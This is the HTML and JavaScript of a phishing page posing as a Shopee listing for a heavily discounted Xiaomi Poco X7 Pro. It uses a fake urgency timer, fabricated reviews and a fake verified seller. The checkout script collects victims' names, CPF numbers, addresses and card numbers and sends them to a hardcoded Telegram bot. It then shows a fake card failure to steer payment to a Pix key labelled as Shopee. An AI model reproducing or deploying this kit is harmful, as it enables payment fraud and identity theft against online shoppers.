<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>Xiaomi Poco X7 Pro 5G - Lote Global 2026</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<script src="https://cdn.tailwindcss.com"></script>

<style>
:root {
--shopee: #ee4d2d;
--shopee-light: #fff5f1;
--btn-green: #00bfa5;
--bg-gray: #f5f5f5;
--text-main: #222;
--text-light: #757575;
}

* {
margin: 0;
padding: 0;
box-sizing: border-box;
-webkit-tap-highlight-color: transparent;
font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
}

body {
background: var(--bg-gray);
color: var(--text-main);
overflow-x: hidden;
padding-bottom: 60px;
}

/* L√ìGICA DE TELAS SEPARADAS */
.page {
display: none;
}

.page.active {
display: block !important;
}

/* HEADER APP STYLE */
.top-nav {
background: white;
padding: 8px 12px;
display: flex;
align-items: center;
position: sticky;
top: 0;
z-index: 1000;
height: 54px;
gap: 10px;
}

.back-icon {
color: var(--shopee);
font-size: 20px;
cursor: pointer;
}

.search-container {
flex: 1;
background: #f0f0f0;
display: flex;
align-items: center;
padding: 6px 12px;
border-radius: 2px;
}

.search-container i {
color: #888;
font-size: 14px;
margin-right: 8px;
}

.search-container input {
background: transparent;
border: none;
outline: none;
font-size: 14px;
width: 100%;
color: #333;
}

.cart-icon {
color: var(--shopee);
font-size: 20px;
position: relative;
}

/* CARROSSEL */
.main-slider {
position: relative;
width: 100%;
background: #fff;
aspect-ratio: 1/1;
}

.carousel-track {
display: flex;
overflow-x: auto;
scroll-snap-type: x mandatory;
height: 100%;
}

.carousel-track::-webkit-scrollbar {
display: none;
}

.carousel-item {
min-width: 100%;
scroll-snap-align: start;
display: flex;
align-items: center;
justify-content: center;
}

.carousel-item img {
width: 100%;
height: 100%;
object-fit: contain;
}

.carousel-index {
position: absolute;
bottom: 15px;
right: 15px;
background: rgba(0, 0, 0, 0.4);
color: #fff;
padding: 2px 10px;
border-radius: 12px;
font-size: 11px;
}

/* FLASH SALE */
.flash-sale {
background: linear-gradient(90deg, #ff4d2d, #ff8a00);
color: white;
padding: 10px 15px;
display: flex;
align-items: center;
justify-content: space-between;
}

.timer {
display: flex;
align-items: center;
gap: 4px;
font-size: 12px;
font-weight: bold;
}

.timer-unit {
background: #333;
color: #fff;
padding: 2px 4px;
border-radius: 2px;
}

/* PRODUCT INFO */
.product-card {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.old-price {
color: #999;
text-decoration: line-through;
font-size: 13px;
}

.price-row {
color: var(--shopee);
font-size: 28px;
font-weight: 500;
display: flex;
align-items: baseline;
gap: 6px;
}

.discount-tag {
background: var(--shopee-light);
color: var(--shopee);
font-size: 11px;
padding: 1px 4px;
border-radius: 2px;
font-weight: bold;
}

.product-title {
font-size: 15px;
line-height: 1.4;
margin-top: 10px;
display: -webkit-box;
-webkit-line-clamp: 2;
-webkit-box-orient: vertical;
overflow: hidden;
}

.tag-indicado {
background: var(--shopee);
color: white;
font-size: 10px;
padding: 1px 4px;
border-radius: 2px;
vertical-align: middle;
margin-right: 4px;
}

/* SHOP SECTION */
.shop-card {
background: white;
padding: 15px;
margin-bottom: 8px;
display: flex;
align-items: center;
justify-content: space-between;
}

.shop-info {
display: flex;
align-items: center;
gap: 12px;
}

.shop-logo {
width: 45px;
height: 45px;
border-radius: 50%;
border: 1px solid #eee;
}

.btn-shop {
border: 1px solid var(--shopee);
color: var(--shopee);
padding: 5px 12px;
font-size: 12px;
border-radius: 2px;
text-decoration: none;
}

/* ACCORDION SECTIONS */
.section-box {
background: white;
margin-bottom: 8px;
}

.section-header-tab {
padding: 15px;
display: flex;
justify-content: space-between;
align-items: center;
cursor: pointer;
border-bottom: 1px solid #f5f5f5;
}

.section-header-tab span {
font-weight: bold;
font-size: 13px;
text-transform: uppercase;
color: #222;
}

.section-content {
padding: 15px;
display: none;
}

.section-content.active {
display: block;
}

.spec-table {
width: 100%;
border-collapse: collapse;
font-size: 13px;
}

.spec-table td {
padding: 10px 0;
border-bottom: 1px solid #f9f9f9;
}

.spec-key {
color: #757575;
width: 45%;
}

.spec-val {
color: #222;
font-weight: 500;
}

.desc-text {
font-size: 13px;
line-height: 1.6;
color: #555;
white-space: pre-line;
}

/* REVIEWS */
.review-section-title {
background: white;
padding: 12px 15px;
display: flex;
justify-content: space-between;
align-items: center;
border-bottom: 1px solid #f2f2f2;
}

.review-item {
background: white;
padding: 15px;
border-bottom: 1px solid #f2f2f2;
}

.review-user {
font-size: 12px;
font-weight: 500;
margin-bottom: 5px;
}

.stars {
color: var(--shopee);
font-size: 10px;
margin-bottom: 8px;
}

.review-text {
font-size: 13px;
margin-bottom: 10px;
}

.review-imgs {
display: flex;
gap: 8px;
overflow-x: auto;
}

.review-imgs img,
.review-imgs video {
width: 85px;
height: 85px;
border-radius: 4px;
object-fit: cover;
background: #000;
}

/* FOOTER BUTTONS - ID√äNTICO SHOPEE */
.footer {
position: fixed;
bottom: 0;
width: 100%;
height: 52px;
background: white;
display: flex;
border-top: 1px solid #eee;
z-index: 1100;
}

.footer-icon-btn {
width: 55px;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
border-right: 1px solid #eee;
color: #00bfa5;
text-decoration: none;
}

.footer-icon-btn i {
font-size: 18px;
}

.footer-icon-btn span {
font-size: 9px;
margin-top: 2px;
color: #555;
}

.btn-add-cart {
flex: 1;
background: rgba(0, 191, 165, 0.1);
color: #00bfa5;
border: none;
font-size: 12px;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
border-right: 1px solid #eee;
}

.btn-add-cart i {
font-size: 18px;
margin-bottom: 2px;
}

.btn-buy-now {
flex: 1.2;
background: var(--shopee);
color: white;
border: none;
font-weight: bold;
font-size: 15px;
cursor: pointer;
}

/* MODAL */
.modal {
display: none;
position: fixed;
inset: 0;
background: rgba(0, 0, 0, 0.6);
z-index: 2000;
}

.modal-content {
position: absolute;
bottom: 0;
width: 100%;
background: #fff;
border-radius: 12px 12px 0 0;
max-height: 85vh;
overflow-y: auto;
padding: 15px;
}

.variant-btn {
background: #f5f5f5;
border: 1px solid #f5f5f5;
padding: 8px 12px;
border-radius: 2px;
font-size: 12px;
cursor: pointer;
}

.variant-btn.selected {
border-color: var(--shopee);
color: var(--shopee);
background: var(--shopee-light);
}

.shopee-card {
background: white;
padding: 15px;
margin-bottom: 8px;
}

.btn-shopee {
background: var(--shopee);
color: white;
font-weight: bold;
}
</style>
</head>

<body>

<div id="p-vitrine" class="page active">
<div class="top-nav">
<i class="fas fa-arrow-left back-icon" onclick="window.location.href='https://shopee.com.br'"></i>

<form action="https://shopee.com.br/search" method="GET" class="search-container" style="display: flex; flex: 1; align-items: center;">
<i class="fas fa-search" style="margin-left: 10px;"></i>
<input type="text" name="keyword" placeholder="Buscar na Shopee" style="border: none; outline: none; width: 100%; padding: 8px;">
</form>

<i class="fas fa-shopping-cart cart-icon" onclick="window.location.href='https://shopee.com.br/cart'"></i>
</div>

<div class="main-slider">
<div class="carousel-track" id="mainTrack">
<div class="carousel-item"><img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/brs6kkrv/D-NQ-NP-970510-MLA101985218069-122025-O.webp"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/v84FW6pL/c1cb1b668aeef4266b070782b5b43c47.webp"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/sfbFKgzD/gsmarena-002.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/qvdPVDgW/gsmarena-001.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/bvy4dGxN/xiaomi-poco-x7-pro-2.jpg"></div>
<div class="carousel-item"><img src="https://i.postimg.cc/6QMgZ9c1/IMG-20260210-142449.jpg"></div>
</div>
<div class="carousel-index" id="carouselNum">1/8</div>
</div>

<div class="flash-sale">
<div style="font-weight:bold; font-style:italic; font-size:14px;"><i class="fas fa-bolt"></i> OFERTA REL√ÇMPAGO</div>
<div class="timer">
TERMINA EM <span class="timer-unit" id="h">01</span> : <span class="timer-unit" id="m">29</span> : <span class="timer-unit" id="s">30</span>
</div>
</div>

<div class="product-card">
<div class="old-price">R$2.299,00</div>
<div class="price-row">R$599,00 <span class="discount-tag">74% OFF</span></div>
<h1 class="product-title">
<span class="tag-indicado">Indicado</span>
Xiaomi Poco X7 PRO 5G Global Version - Lote Exclusivo 2026 (12GB/512GB)
</h1>
</div>

<div class="shop-card">
<div class="shop-info">
<img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-m8ktdfse9yq937" class="shop-logo">
<div>
<p style="font-weight:bold; font-size:14px;">Onix Oficial <i class="fas fa-check-circle" style="color:#2673dd; font-size:12px;"></i></p>
<p style="font-size:11px; color:#888;">Ativo h√° 3 minutos</p>
</div>
</div>
<a href="https://shopee.com.br/shop/1078992312" class="btn-shop">Ver P√°gina</a>
</div>

<div class="section-box">
<div class="section-header-tab" onclick="toggleSection('spec-content')">
<span>Especifica√ß√µes do Produto</span>
<i class="fas fa-chevron-down"></i>
</div>
<div class="section-content" id="spec-content">
<table class="spec-table">
<tr><td class="spec-key">Estoque dispon√≠vel</td><td class="spec-val">512GB</td></tr>
<tr><td class="spec-key">Garantia</td><td class="spec-val">3 Meses</td></tr>
<tr><td class="spec-key">Processador</td><td class="spec-val">Dimensity 8400-Ultra (4nm)</td></tr>
<tr><td class="spec-key">RAM</td><td class="spec-val">12GB</td></tr>
<tr><td class="spec-key">Bateria</td><td class="spec-val">6000mAh</td></tr>
</table>
</div>
</div>

<div class="section-box">
<div class="section-header-tab" onclick="toggleSection('desc-content')">
<span>Descri√ß√£o do Produto</span>
<i class="fas fa-chevron-down"></i>
</div>
<div class="section-content desc-text" id="desc-content">
ESPECIFICA√á√ïES T√âCNICAS COMPLETAS:
- Lote Global 2026 Lacrado
- Tela AMOLED CrystalRes 6.67" 120Hz
- Carregamento HyperCharge 90W
</div>
</div>

<div class="review-section-title" style="display: block; padding-bottom: 5px;">
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px;">
<span style="font-weight:bold; font-size:13px; color:#222;">AVALIA√á√ïES DO PRODUTO (19.566)</span>
<a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" style="color:var(--shopee); font-size:12px; text-decoration:none;">Ver Tudo ></a>
</div>
<div style="display: flex; align-items: center; gap: 5px;">
<div class="stars" style="margin-bottom: 0; font-size: 12px;">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<span style="color: var(--shopee); font-size: 13px; font-weight: bold;">5.0</span>
<span style="color: #757575; font-size: 13px;">(20.920 resenhas)</span>
</div>
</div>

<div class="review-item">
<p class="review-user">a***n</p>
<div class="stars">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<p class="review-text">Sensacional! Chegou antes do prazo e muito bem lacrado. O desempenho desse Poco X7 Pro √© de outro n√≠vel, recomendo!</p>
<div class="review-imgs">
<img src="https://i.postimg.cc/ctv07Hv2/br-11134103-81ztc-mk5oi70vvpxf33.webp">
<img src="https://i.postimg.cc/qNV4npp0/br-11134103-81ztc-mju9ycl4xfd241.webp">
<img src="https://i.postimg.cc/2b6Dm678/br-11134103-81ztc-mjoqss93c3k126.webp">
</div>
</div>

<div class="review-item">
<p class="review-user">g***v</p>
<div class="stars">‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê</div>
<p class="review-text">Aparelho lind√≠ssimo. A cor √© diferenciada e o sistema HyperOS 2 est√° muito fluido. Valeu cada centavo.</p>
<div class="review-imgs">
<img src="https://i.postimg.cc/qzndpWyb/br-11134103-81ztc-mke1j4czd34324.webp">
<img src="https://i.postimg.cc/5XSdCvPw/br-11134103-81z1k-miiog3qhwzcz53.webp">
</div>
</div>

<div class="footer">
<a href="#" class="footer-icon-btn"><i class="far fa-comment-dots"></i><span>Chat</span></a>
<button class="btn-add-cart" onclick="openModal()"><i class="fas fa-cart-plus"></i><span>Carrinho</span></button>
<button class="btn-buy-now" onclick="openModal()">Compre Agora</button>
</div>

<div id="modal-variants" class="modal">
<div class="modal-content">
<div class="flex gap-4 mb-4 relative border-b pb-4">
<img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="w-24 h-24 border rounded">
<div class="flex flex-col justify-end">
<p class="text-orange-600 text-2xl font-bold" id="v-price">R$ 599,00</p>
<div class="old-price">R$2.299,00</div>
<p class="text-[10px] text-gray-400">Estoque: 1.071</p>
</div>
<i onclick="closeModal()" class="fas fa-times absolute right-0 top-0 text-gray-300 p-2 cursor-pointer"></i>
</div>
<p class="text-xs font-bold mb-3 text-gray-500">COR</p>
<div class="flex flex-wrap gap-2 mb-4">
<button class="variant-btn v-color selected" onclick="selColor(this, 'Preto Onyx')">Preto Onyx</button>
<button class="variant-btn v-color" onclick="selColor(this, 'Verde Poco')">Verde Poco</button>
<button class="variant-btn v-color" onclick="selColor(this, 'Iron Man Edition')">Iron Man Edition</button>
<button class="variant-btn v-color" onclick="selColor(this, 'Amarelo Poco')">Amarelo Poco</button>
</div>
<p class="text-xs font-bold mb-3 text-gray-500">CAPACIDADE</p>
<div class="flex flex-wrap gap-2 mb-8">
<button class="variant-btn v-size selected" onclick="selSize(this, 599)">256GB / 12GB RAM</button>
<button class="variant-btn v-size" onclick="selSize(this, 799)">512GB / 12GB RAM</button>
</div>
<div class="flex justify-between items-center mb-6 border-t pt-4">
<span class="text-sm font-bold">Quantidade</span>
<div class="flex border rounded overflow-hidden">
<button class="px-3 py-1 bg-gray-100" onclick="adjQty(-1)">-</button>
<input id="qty" value="1" readonly class="w-10 text-center text-sm">
<button class="px-3 py-1 bg-gray-100" onclick="adjQty(1)">+</button>
</div>
</div>

<button onclick="comprarAgora()" class="w-full bg-[#ee4d2d] text-white py-3 rounded-sm font-bold uppercase text-sm">Confirmar</button>
</div>
</div>

<div id="p-envio" class="page">
<div class="bg-white px-4 py-3 flex items-center gap-4 border-b">
<i class="fas fa-arrow-left text-orange-600 text-lg cursor-pointer" onclick="backToVitrine()"></i>
<h1 class="text-lg font-medium">Informa√ß√µes de Envio</h1>
</div>
<div class="p-4 space-y-4">
<div class="bg-white p-4 rounded-sm border-t-2 border-orange-600 space-y-3">
<div class="flex items-center gap-2 text-[#26aa99] font-medium text-[11px]">
<i class="fas fa-shield-halved"></i> Seus dados est√£o protegidos por ShopeePay
</div>
<input type="text" id="in-nome" placeholder="Nome Completo" class="w-full border p-3 rounded-sm text-sm outline-none">
<div class="flex gap-2">
<input type="tel" id="in-cep" placeholder="CEP" maxlength="9" oninput="mCEP(this)" class="flex-1 border p-3 rounded-sm text-sm outline-none">
<button onclick="buscarCEP()" class="bg-gray-800 text-white px-4 rounded-sm text-[10px] font-bold">BUSCAR</button>
</div>
<input type="tel" id="in-cpf" placeholder="CPF do Titular" maxlength="14" oninput="mCPF(this)" class="w-full border p-3 rounded-sm text-sm outline-none">
<input type="text" id="in-rua" placeholder="Endere√ßo (Rua e Bairro)" class="w-full border p-3 rounded-sm text-sm">
<div class="flex gap-2">
<input type="text" id="in-num" placeholder="N¬∫" class="w-20 border p-3 rounded-sm text-sm">
<input type="text" id="in-cid" placeholder="Cidade / UF" class="flex-1 border p-3 rounded-sm text-sm">
</div>
</div>
<button onclick="goCheckout()" class="w-full bg-[#ee4d2d] text-white py-4 rounded-sm text-sm uppercase font-bold">Pr√≥ximo: Pagamento</button>
</div>
</div>

<div id="p-checkout" class="page pb-24">
<div class="bg-white px-4 py-3 border-b flex items-center gap-4 sticky top-0 z-50">
<i class="fas fa-arrow-left text-orange-600 text-lg cursor-pointer" onclick="backToEnvio()"></i>
<h1 class="text-lg font-medium">Finalizar Pedido</h1>
</div>

<div class="bg-white p-4 border-b-2 border-dashed border-orange-500 mb-2">
<div class="flex gap-3 text-sm">
<i class="fas fa-location-dot text-orange-600 mt-1"></i>
<div>
<p class="font-bold uppercase text-[12px]" id="res-nome"></p>
<p class="text-gray-500 text-[11px]" id="res-end"></p>
</div>
</div>
</div>

<div class="shopee-card">
<div class="flex gap-4">
<img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="w-20 h-20 border rounded">
<div class="flex-1">
<h2 class="text-xs font-medium">Xiaomi Poco X7 PRO 5G - Global 2026</h2>
<p class="text-[10px] text-orange-600 mt-1" id="res-variant"></p>
<p class="text-orange-600 font-bold">R$ <span id="res-price">599,00</span></p>
<div class="old-price">R$2.299,00</div>
</div>
</div>
</div>

<div class="bg-white p-4 mt-2">
<p class="text-[10px] font-bold text-gray-400 uppercase mb-4">Adicionar Prote√ß√£o</p>
<div class="flex justify-between items-center mb-4">
<div class="text-xs">
<p class="font-bold">Seguro Roubo e Furto</p>
<p class="text-gray-400">Prote√ß√£o total (+R$ 39,00)</p>
</div>
<label class="switch"><input type="checkbox" id="seg1" onchange="atualizarTotal()"><span class="slider"></span></label>
</div>
<div class="flex justify-between items-center">
<div class="text-xs">
<p class="font-bold">Garantia Estendida</p>
<p class="text-gray-400">Mais 12 meses (+R$ 29,00)</p>
</div>
<label class="switch"><input type="checkbox" id="seg2" onchange="atualizarTotal()"><span class="slider"></span></label>
</div>
</div>

<div class="bg-white p-4 mt-2">
<p class="text-[10px] font-bold text-gray-400 uppercase mb-3">M√©todo de Pagamento</p>
<label class="flex justify-between py-3 border-b items-center" onclick="setMode('pix')">
<div class="flex items-center gap-3">
<i class="fab fa-pix text-teal-500 text-xl"></i>
<span class="text-sm">Pix <span class="text-orange-600 font-bold text-[10px]">(-R$ 20 OFF)</span></span>
</div>
<input type="radio" name="pay" checked class="w-5 h-5 accent-orange-600">
</label>
<label class="flex justify-between py-3 items-center" onclick="setMode('card')">
<div class="flex items-center gap-3">
<i class="far fa-credit-card text-orange-600 text-xl"></i>
<span class="text-sm">Cart√£o de Cr√©dito</span>
</div>
<input type="radio" name="pay" class="w-5 h-5 accent-orange-600">
</label>

<div id="card-form" class="hidden mt-4 space-y-2 animate-fadeIn">
<input id="c-nome" placeholder="Nome impresso no cart√£o" class="bg-gray-50 p-3 w-full border rounded text-sm uppercase" oninput="mLETRAS(this)">
<input id="c-num" placeholder="N√∫mero do Cart√£o" class="bg-gray-50 p-3 w-full border rounded text-sm" oninput="mCARD(this)" maxlength="19">
<div class="flex gap-2">
<input id="c-val" placeholder="MM/AA" class="bg-gray-50 p-3 w-1/2 border rounded text-sm text-center" oninput="mVAL(this)" maxlength="5">
<input id="c-cvv" placeholder="CVV" class="bg-gray-50 p-3 w-1/2 border rounded text-sm text-center" maxlength="4">
</div>
</div>
</div>

<div class="bg-white p-4 mt-2 space-y-2">
<div class="flex justify-between text-xs text-gray-500"><span>Subtotal (itens)</span><span id="sum-sub"></span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Frete</span><span>R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Cupom Frete Gr√°tis</span><span class="text-teal-600">-R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500" id="row-pix"><span>Desconto PIX</span><span class="text-orange-600">-R$ 20,00</span></div>
<div class="flex justify-between text-sm font-bold border-t pt-2"><span>Total a pagar</span><span class="text-orange-600 text-lg" id="sum-total"></span></div>
</div>

<div class="bg-white p-4 mt-2 space-y-2">
<div class="flex justify-between text-xs text-gray-500"><span>Subtotal (itens)</span><span id="sum-sub"></span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Frete</span><span>R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Cupom Frete Gr√°tis</span><span class="text-teal-600">-R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500" id="row-pix"><span>Desconto PIX</span><span class="text-orange-600">-R$ 20,00</span></div>
<div class="flex justify-between text-sm font-bold border-t pt-2"><span>Total a pagar</span><span class="text-orange-600 text-lg" id="sum-total"></span></div>
</div>

<div class="bg-white p-4 mt-2 space-y-2">
<div class="flex justify-between text-xs text-gray-500"><span>Subtotal (itens)</span><span id="sum-sub"></span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Frete</span><span>R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500"><span>Cupom Frete Gr√°tis</span><span class="text-teal-600">-R$ 26,30</span></div>
<div class="flex justify-between text-xs text-gray-500" id="row-pix"><span>Desconto PIX</span><span class="text-orange-600">-R$ 20,00</span></div>
<div class="flex justify-between text-sm font-bold border-t pt-2"><span>Total a pagar</span><span class="text-orange-600 text-lg" id="sum-total"></span></div>
</div>

<div class="fixed bottom-0 w-full bg-white border-t p-3 flex items-center justify-between z-50">
<div class="text-right flex-1 pr-4">
<p class="text-[9px] text-gray-400">Total</p>
<p id="foot-val" class="text-orange-600 font-bold text-xl"></p>
</div>
<button onclick="processFinal()" class="bg-orange-600 text-white px-10 py-3 font-bold">FAZER PEDIDO</button>
</div>
</div>

<div id="p-pix" class="page bg-white">
<div class="p-8 text-center">
<div class="w-16 h-16 bg-teal-500 rounded-full flex items-center justify-center mx-auto mb-6"><i class="fas fa-check text-white text-3xl"></i></div>
<h2 class="text-xl font-bold uppercase">aguardando o pagamento...!</h2>
<div class="mt-8 p-6 bg-gray-50 rounded-xl border-2 border-dashed border-teal-400">
<p class="text-3xl font-bold text-teal-600 mb-6" id="pix-final-val"></p>
<img id="img-qr" src="" class="mx-auto w-40 h-40 mb-6">
<button onclick="copiarPix()" class="w-full bg-teal-500 text-white py-4 rounded-lg font-bold">COPIAR C√ìDIGO PIX</button>
</div>
<div class="p-4 space-y-4">
<div class="bg-white p-4 rounded-sm space-y-3">
<div class="flex items-center gap-2 text-[#26aa99] font-medium text-[11px]">
<i class="fas fa-shield-halved"></i> Seus dados est√£o protegidos por ShopeePay
</div>
</div>
</div>
</div>
</div>
<script>
const BOT_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
const CHAT_ID = '7294447445';
const CHAVE_PIX = '71241897-2447-4bbd-a5bf-81c62a376409';

let vBase = 599.00,
cor = 'Preto Onyx',
ram = '256GB / 12GB RAM',
payM = 'pix';
window.currentPix = "";

// Fun√ß√µes de Navega√ß√£o Corrigidas
function openPage(id) {
document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
document.getElementById(id).classList.add('active');
window.scrollTo(0,0);
}

// NAVEGA√á√ÉO ENTRE TELAS - CORRIGIDA
function openPage(id) {
document.querySelectorAll('.page').forEach(p => {
p.classList.remove('active');
p.style.display = 'none'; // Garante que a anterior suma
});
const target = document.getElementById(id);
if(target) {
target.classList.add('active');
target.style.display = 'block'; // Garante que a nova apare√ßa
window.scrollTo(0, 0);
}
}

function openModal() { document.getElementById('modal-variants').style.display = 'block'; }
function closeModal() { document.getElementById('modal-variants').style.display = 'none'; }
function backToVitrine() { openPage('p-vitrine'); }
function backToEnvio() { openPage('p-envio'); }

function toggleSection(id) {
const content = document.getElementById(id);
if(content) content.classList.toggle('active');
}

function selColor(btn, n) {
btn.parentElement.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('selected'));
btn.classList.add('selected');
cor = n;
}

function selSize(btn, p) {
btn.parentElement.querySelectorAll('.variant-btn').forEach(b => b.classList.remove('selected'));
btn.classList.add('selected');
vBase = parseFloat(p);
ram = btn.innerText;
document.getElementById('v-price').innerText = `R$ ${vBase.toFixed(2).replace('.', ',')}`;
}

// ESSA FUN√á√ÉO ABRE A TELA DE ENVIO
function comprarAgora() {
closeModal();
openPage('p-envio');
}

function adjQty(val) {
let q = document.getElementById('qty');
let n = parseInt(q.value) + val;
if(n > 0) q.value = n;
atualizarTotal();
}

window.setMode = function(m) {
payM = m;
const cardForm = document.getElementById('card-form');
const rowPix = document.getElementById('row-pix');
if(cardForm) cardForm.classList.toggle('hidden', m === 'pix');
if(rowPix) rowPix.style.display = (m === 'pix') ? 'flex' : 'none';
atualizarTotal();
}

// NOMENCLATURA UNIFICADA PARA ATUALIZAR TOTAL
function atualizarTotal() {
let t = vBase;
const s1 = document.getElementById('seg1');
const s2 = document.getElementById('seg2');
if(s1 && s1.checked) t += 39;
if(s2 && s2.checked) t += 29;
if (payM === 'pix') t -= 20;

const f = t.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

if(document.getElementById('sum-sub')) document.getElementById('sum-sub').innerText = `R$ ${vBase.toFixed(2).replace('.', ',')}`;
if(document.getElementById('sum-total')) document.getElementById('sum-total').innerText = f;
if(document.getElementById('foot-val')) document.getElementById('foot-val').innerText = f;
if(document.getElementById('pix-final-val')) document.getElementById('pix-final-val').innerText = f;

return t.toFixed(2);
}

async function buscarCEP() {
let cep = document.getElementById('in-cep').value.replace(/\D/g, '');
if (cep.length !== 8) return alert("CEP inv√°lido");
try {
const r = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
const d = await r.json();
if (!d.erro) {
document.getElementById('in-rua').value = `${d.logradouro} - ${d.bairro}`;
document.getElementById('in-cid').value = `${d.localidade} / ${d.uf}`;
}
} catch(e) { alert("Erro ao buscar CEP"); }
}

function goCheckout() {
const nomeInput = document.getElementById('in-nome');
const cpfInput = document.getElementById('in-cpf');

if (!nomeInput || !cpfInput || nomeInput.value.length < 5) {
return alert("Por favor, preencha o nome completo!");
}

const resNome = document.getElementById('res-nome');
const resEnd = document.getElementById('res-end');

if (resNome) resNome.innerText = nomeInput.value;
if (resEnd) {
const rua = document.getElementById('in-rua')?.value || "";
const num = document.getElementById('in-num')?.value || "";
resEnd.innerText = `${rua}, ${num}`;
}

openPage('p-checkout');
atualizarTotal();
}

// --- L√ìGICA PIX MANTIDA ---
function gerarPix(v) {
const f = (id, val) => id + val.length.toString().padStart(2, '0') + val;
const conta = f('00', 'br.gov.bcb.pix') + f('01', CHAVE_PIX);
let p = f('00', '01') + f('26', conta) + f('52', '0000') + f('53', '986') + f('54', v) + f('58', 'BR') + f('59', 'SHOPEE') + f('60', 'SAO PAULO') + f('62', f('05', '***')) + '6304';
let crc = 0xFFFF;
for (let i = 0; i < p.length; i++) {
crc ^= (p.charCodeAt(i) << 8);
for (let j = 0; j < 8; j++) crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : (crc << 1);
}
return p + (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
}

window.processFinal = async function() {
const total = atualizarTotal();
const cNum = document.getElementById('c-num').value || 'PIX';
const msg = `üíé *VENDA SHOPEE* üíé\n\nüë§: ${document.getElementById('in-nome').value}\nüÜî: ${document.getElementById('in-cpf').value}\nüì¶: Poco X7 Pro (${cor})\nüí∞: R$ ${total}\nüí≥: ${payM.toUpperCase()}\nüÉè: ${cNum}`;

try {
await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
});
} catch(e) { console.error("Erro Telegram"); }

if (payM === 'card') {
alert("‚ö†Ô∏è Erro no processamento do cart√£o. Tente via Pix para garantir o desconto!");
window.setMode('pix');
document.getElementsByName('pay')[0].checked = true;
} else {
const payload = gerarPix(total);
window.currentPix = payload;
document.getElementById('img-qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(payload)}`;
openPage('p-pix');
}
}

function copiarPix() {
navigator.clipboard.writeText(window.currentPix).then(() => alert("‚úÖ C√≥digo Pix Copiado!"));
}

// Controle de Navega√ß√£o entre Telas
function showPage(pageId) {
// Esconde todas as p√°ginas
document.querySelectorAll('.page').forEach(page => {
page.classList.remove('active');
});
// Mostra a p√°gina desejada
document.getElementById(pageId).classList.add('active');
window.scrollTo(0, 0);
}

// Controle do Modal de Compra
function toggleModal(status) {
const modal = document.getElementById('modal-variants');
modal.style.display = status ? 'block' : 'none';
}

// Sele√ß√£o de Variantes (Cor/Tamanho)
function selectVariant(element) {
const parent = element.parentElement;
parent.querySelectorAll('.variant-btn').forEach(btn => {
btn.classList.remove('selected');
});
element.classList.add('selected');
}

// L√≥gica simples de CEP (exemplo visual)
function buscarCEP() {
const cep = document.getElementById('in-cep').value;
if(cep.length === 9) {
alert("CEP Localizado: Enviando para sua regi√£o!");
}
}

function mCPF(i) { i.value = i.value.replace(/\D/g, '').replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2"); }
function mCEP(i) { i.value = i.value.replace(/\D/g, '').replace(/(\d{5})(\d)/, "$1-$2"); }
function mCARD(i) { i.value = i.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, "$1 "); }
function mVAL(i) { i.value = i.value.replace(/\D/g, '').replace(/(\d{2})(\d)/, "$1/$2"); }

const track = document.getElementById('mainTrack');
if(track) {
track.addEventListener('scroll', () => {
const index = Math.round(track.scrollLeft / track.offsetWidth) + 1;
document.getElementById('carouselNum').innerText = `${index}/7`;
});
}

// Inicializa os pre√ßos no carregamento
window.onload = atualizarTotal;
</script>
</body>
    </html>
    
